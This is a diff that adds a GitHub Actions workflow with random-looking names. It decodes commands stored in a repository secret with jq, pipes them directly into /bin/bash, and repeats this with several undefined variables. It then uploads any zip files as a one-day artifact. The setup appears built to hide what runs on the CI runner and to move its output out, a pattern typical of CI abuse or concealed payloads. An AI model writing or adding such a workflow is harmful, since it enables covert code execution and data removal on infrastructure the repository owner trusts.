@@ -1,0 +1,24 @@
+name: roxannebabel1808
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: roxannebabel1808
+        env:
+          qoyl61: ${{ secrets.qoyl61 }}
+        run: |
+          printf '%s' "$qoyl61" | jq -r .ippc21455 | /bin/bash
+          printf '%s' "$bp511" | jq -r .ifzol49 | /bin/bash
+          echo $nisok34578 | jq -r .ksjgu0167 | /bin/bash
+          echo $m75 | jq -r .lfyc3516 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: 7gM6FwA1
+          path: "*.zip"
+          retention-days: 1
